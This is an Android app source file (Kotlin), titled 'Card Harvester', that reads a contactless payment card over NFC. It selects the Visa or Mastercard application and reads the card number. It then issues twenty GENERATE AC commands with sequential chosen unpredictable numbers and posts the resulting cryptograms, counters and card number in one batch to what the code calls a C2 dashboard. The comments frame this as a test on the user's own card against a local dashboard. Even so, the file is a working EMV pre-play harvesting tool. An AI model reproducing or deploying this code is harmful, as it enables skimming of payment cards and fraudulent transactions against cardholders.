package xyz.nfc.harvester

import android.app.PendingIntent
import android.content.Intent
import android.graphics.*
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.os.Bundle
import android.view.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Card Harvester — App 1
 *
 * Tap your own real card once → runs 20 GENERATE AC commands (UN = 00000001 … 00000014) →
 * POSTs all 20 transactions to C2 dashboard in one request.
 *
 * Flow:
 *   IDLE    → user presses ARM → READY (NFC dispatch enabled)
 *   READY   → card tapped → HARVESTING (EMV session, 20 GENERATE ACs)
 *   HARVESTING → done → POSTING → DONE / ERROR
 */
class MainActivity : AppCompatActivity() {

    companion object {
        const val HARVEST_COUNT = 20
    }

    private lateinit var nfcAdapter: NfcAdapter
    private var armed = false

    // UI refs
    private lateinit var statusTitle: TextView
    private lateinit var statusSub:   TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var progressLabel: TextView
    private lateinit var armBtn:      Button
    private lateinit var logView:     TextView
    private lateinit var cardView:    View

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        buildUi()
    }

    override fun onResume() {
        super.onResume()
        if (armed) enableNfc()
    }

    override fun onPause() {
        super.onPause()
        nfcAdapter.disableForegroundDispatch(this)
    }

    /** NFC card tapped while armed. */
    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (!armed) return
        val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG) ?: return
        val isoDep = IsoDep.get(tag) ?: return

        armed = false
        nfcAdapter.disableForegroundDispatch(this)
        startHarvest(isoDep)
    }

    // ── Harvest pipeline ──────────────────────────────────────────────────

    private fun startHarvest(isoDep: IsoDep) {
        setUiState("HARVESTING", "Running 20 GENERATE AC commands…")
        progressBar.max      = HARVEST_COUNT
        progressBar.progress = 0
        progressBar.visibility = View.VISIBLE
        progressLabel.visibility = View.VISIBLE
        armBtn.isEnabled = false

        lifecycleScope.launch {
            val result = withContext(Dispatchers.IO) { runHarvest(isoDep) }
            when (result) {
                is HarvestOutcome.Success -> {
                    setUiState("POSTING", "Sending ${result.txs.size} records to C2…")
                    val ok = withContext(Dispatchers.IO) {
                        C2Poster.postBatch(result.pan, result.aid, result.txs)
                    }
                    if (ok) {
                        setUiState("✅ DONE",
                            "Sent ${result.txs.size} transactions to C2\n" +
                            "PAN: ****${result.pan.takeLast(4)}\n" +
                            "Check http://localhost:4444 on your Mac")
                    } else {
                        setUiState("❌ C2 ERROR",
                            "Harvested ${result.txs.size} tx but POST failed.\n" +
                            "Is dashboard running on :4444? ADB tunnel up?")
                    }
                    updateLog(result.txs)
                }
                is HarvestOutcome.Error -> {
                    setUiState("❌ CARD ERROR", result.message)
                }
            }
            progressBar.visibility  = View.GONE
            progressLabel.visibility = View.GONE
            armBtn.isEnabled   = true
            armBtn.text        = "🔄 Harvest Again"
        }
    }

    private suspend fun runHarvest(isoDep: IsoDep): HarvestOutcome {
        return try {
            isoDep.connect()
            isoDep.timeout = 5000

            val session = EmvSession(isoDep)

            // Try Visa first, fall back to Mastercard if SELECT or GPO fails
            var gpo: ByteArray = byteArrayOf()
            var chosenAidLabel = "VISA"
            try {
                appendLog("SELECT Visa AID…")
                session.selectApp(EmvSession.VISA_AID)
                appendLog("GET PROCESSING OPTIONS (Visa)…")
                gpo = session.getProcessingOptions()
                chosenAidLabel = "VISA"
            } catch (e: Exception) {
                appendLog("Visa failed (${e.message}) — trying Mastercard…")
                session.selectApp(EmvSession.MC_AID)
                appendLog("GET PROCESSING OPTIONS (MC)…")
                gpo = session.getProcessingOptions()
                chosenAidLabel = "MC"
            }
            appendLog("GPO OK ($chosenAidLabel)")

            appendLog("READ RECORDS (parsing CDOL1, PAN)…")
            session.readRecords(gpo)

            val txs = mutableListOf<C2Poster.TxEntry>()
            var harvestedPan = "UNKNOWN"
            var harvestedAid = EmvSession.VISA_AID.toHex()

            for (i in 1..HARVEST_COUNT) {
                val un = ByteArray(4).also { b ->
                    b[0] = (i shr 24).toByte()
                    b[1] = (i shr 16).toByte()
                    b[2] = (i shr  8).toByte()
                    b[3] = i.toByte()
                }
                val t0 = System.currentTimeMillis()
                val r  = session.generateAc(un)
                val ms = (System.currentTimeMillis() - t0).toDouble()

                // Capture pan/aid from first result (set by readRecords earlier)
                if (i == 1) {
                    harvestedPan = r.pan
                    harvestedAid = r.aid.toHex()
                }

                txs += C2Poster.TxEntry(
                    atcHex   = r.atc.toHex(),
                    arqcHex  = r.arqc.toHex(),
                    unHex    = un.toHex(),
                    timingMs = ms
                )
                withContext(Dispatchers.Main) {
                    progressBar.progress = i
                    progressLabel.text   = "$i / $HARVEST_COUNT"
                    appendLog("[$i/$HARVEST_COUNT] UN=${un.toHex()}  ARQC=${r.arqc.toHex().take(16)}…  ATC=${r.atc.toHex()}")
                }
            }

            isoDep.close()

            HarvestOutcome.Success(pan = harvestedPan, aid = harvestedAid, txs = txs)
        } catch (e: Exception) {
            try { isoDep.close() } catch (_: Exception) {}
            HarvestOutcome.Error(e.message ?: "Unknown error")
        }
    }

    // ── UI ────────────────────────────────────────────────────────────────

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0D1117"))
        }

        // Header
        root.addView(TextView(this).apply {
            text = "Card Harvester"
            setTextColor(Color.parseColor("#58A6FF"))
            textSize = 20f; setPadding(24, 40, 24, 4)
            typeface = Typeface.DEFAULT_BOLD
        })
        root.addView(TextView(this).apply {
            text = "Tap your card once → 20 GENERATE AC → C2"
            setTextColor(Color.parseColor("#8B949E"))
            textSize = 12f; setPadding(24, 0, 24, 20)
        })

        // Card graphic
        cardView = buildCardView()
        root.addView(cardView)

        // Status
        statusTitle = TextView(this).apply {
            text = "IDLE"
            setTextColor(Color.WHITE)
            textSize = 22f; gravity = Gravity.CENTER
            setPadding(24, 24, 24, 4)
        }
        root.addView(statusTitle)

        statusSub = TextView(this).apply {
            text = "Press ARM then hold your card to the phone"
            setTextColor(Color.parseColor("#8B949E"))
            textSize = 13f; gravity = Gravity.CENTER
            setPadding(24, 0, 24, 20)
        }
        root.addView(statusSub)

        // Progress
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = HARVEST_COUNT
            setProgressTintList(android.content.res.ColorStateList.valueOf(
                Color.parseColor("#33FF57")))
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 16).apply { setMargins(24,0,24,4) }
            visibility = View.GONE
        }
        root.addView(progressBar)

        progressLabel = TextView(this).apply {
            text = ""; textSize = 12f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#33FF57"))
            visibility = View.GONE
        }
        root.addView(progressLabel)

        // ARM button
        armBtn = Button(this).apply {
            text = "⚡ ARM — ready to tap card"
            textSize = 14f
            setBackgroundColor(Color.parseColor("#1A3A1A"))
            setTextColor(Color.parseColor("#33FF57"))
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(24, 8, 24, 8) }
            setOnClickListener { toggleArm() }
        }
        root.addView(armBtn)

        // Log scroll
        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f)
        }
        logView = TextView(this).apply {
            text = "Log:\n"
            setTextColor(Color.parseColor("#8B949E"))
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setBackgroundColor(Color.parseColor("#0D1117"))
            setPadding(16, 16, 16, 16)
        }
        scroll.addView(logView)
        root.addView(scroll)

        setContentView(root)
    }

    private fun buildCardView(): View {
        val canvas = object : View(this) {
            override fun onDraw(c: Canvas) {
                val w = width.toFloat(); val h = height.toFloat()
                val paint = Paint(Paint.ANTI_ALIAS_FLAG)
                // Card background gradient
                paint.shader = LinearGradient(0f, 0f, w, h,
                    Color.parseColor("#1C3A5A"), Color.parseColor("#0A1A30"),
                    Shader.TileMode.CLAMP)
                c.drawRoundRect(RectF(0f, 0f, w, h), 24f, 24f, paint)
                paint.shader = null
                // Chip
                paint.color = Color.parseColor("#D4A017")
                c.drawRoundRect(RectF(32f, h*0.3f, 80f, h*0.65f), 6f, 6f, paint)
                // Label
                paint.color = Color.WHITE; paint.textSize = 32f
                paint.typeface = Typeface.DEFAULT_BOLD
                c.drawText("VISA", w - 100f, h - 24f, paint)
                // NFC symbol
                paint.color = Color.parseColor("#88AABB")
                paint.style  = Paint.Style.STROKE; paint.strokeWidth = 3f
                for (r in listOf(18f, 28f, 38f)) {
                    c.drawArc(RectF(w-90f-r, h*0.3f-r, w-90f+r, h*0.3f+r),
                        -60f, 120f, false, paint)
                }
            }
        }
        canvas.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 180).apply { setMargins(24, 0, 24, 16) }
        return canvas
    }

    private fun toggleArm() {
        armed = !armed
        if (armed) {
            enableNfc()
            setUiState("READY", "Hold your card to the back of the phone…")
            armBtn.text = "🔴 ARMED — waiting for card (tap to cancel)"
            armBtn.setBackgroundColor(Color.parseColor("#3A1A1A"))
            armBtn.setTextColor(Color.parseColor("#FF6B6B"))
        } else {
            nfcAdapter.disableForegroundDispatch(this)
            setUiState("IDLE", "Press ARM then hold your card to the phone")
            armBtn.text = "⚡ ARM — ready to tap card"
            armBtn.setBackgroundColor(Color.parseColor("#1A3A1A"))
            armBtn.setTextColor(Color.parseColor("#33FF57"))
        }
    }

    private fun enableNfc() {
        val intent = Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        val pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        nfcAdapter.enableForegroundDispatch(this, pi, null, null)
    }

    private fun setUiState(title: String, sub: String) {
        runOnUiThread { statusTitle.text = title; statusSub.text = sub }
    }

    private fun appendLog(msg: String) {
        runOnUiThread { logView.append("$msg\n") }
    }

    private fun updateLog(txs: List<C2Poster.TxEntry>) {
        appendLog("\n── Harvest Summary ──")
        txs.forEachIndexed { i, tx ->
            appendLog("${i+1}. UN=${tx.unHex}  ARQC=${tx.arqcHex}  ATC=${tx.atcHex}")
        }
    }

    private fun ByteArray.toHex() = joinToString("") { "%02X".format(it) }

    // ── Outcome sealed class ──────────────────────────────────────────────

    sealed class HarvestOutcome {
        data class Success(val pan: String, val aid: String, val txs: List<C2Poster.TxEntry>) : HarvestOutcome()
        data class Error(val message: String) : HarvestOutcome()
    }
}
